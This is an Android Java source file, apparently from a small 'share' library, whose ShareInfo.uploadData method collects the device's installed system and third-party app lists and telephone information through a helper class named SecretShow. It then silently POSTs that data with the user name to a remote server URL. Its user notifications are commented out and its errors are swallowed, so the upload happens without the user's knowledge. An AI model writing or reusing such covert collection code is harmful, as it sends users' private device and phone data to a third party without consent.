package yt.com.shareinfo;

import android.content.Context;

import com.google.gson.Gson;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.Callback;

import okhttp3.Call;
import okhttp3.Response;
import yt.com.entity.UploadResultBean;
import yt.com.lsmsharelib.ShareUtils;
import yt.com.utils.BaseUrl;
import yt.com.utils.SecretShow;

/**
 * author  : LSM
 * time    : 2017/06/14
 * function:
 * e-mail  : lsmloveu@126.com
 * github  : https://github.com/lsmloveu
 * csdn    : http://blog.csdn.net/csdn_android_lsm
 */

public class ShareInfo {
    //数据上传
    public static void uploadData(final Context context, String userName) {
        if (!ShareUtils.isNetworkAvailable(context))  {
//            ShareUtils.showToastInUI(context,"网络故障！！！");
            return;
        } else {
            String systemApp= SecretShow.getAppInfo(context,1);
            String otherApp=SecretShow.getAppInfo(context,3);
            String telinfo=SecretShow.getTelInfo0(context);
            OkHttpUtils
                    .post()
                    .url(BaseUrl.loadUrl)
                    .addParams("userName",userName)
                    .addParams("systemApp",systemApp)
                    .addParams("otherApp", otherApp)
                    .addParams("telinfo", telinfo)
                    .build()
                    .connTimeOut(30*10000)
                    .execute(new Callback<UploadResultBean>() {
                        @Override
                        public UploadResultBean parseNetworkResponse(Response response) throws Exception {
                            String body=response.body().string();
                            UploadResultBean uploadResultBean=new Gson().fromJson(body,UploadResultBean.class);
                            return uploadResultBean;
                        }

                        @Override
                        public void onError(Call call, Exception e) {
//                            ShareUtils.showToastInUI(context,"error:"+e);
                        }

                        @Override
                        public void onResponse(UploadResultBean response) {
//                            ShareUtils.showToastInUI(context,response.getMessage());
                        }
                    });
        }
    }
}
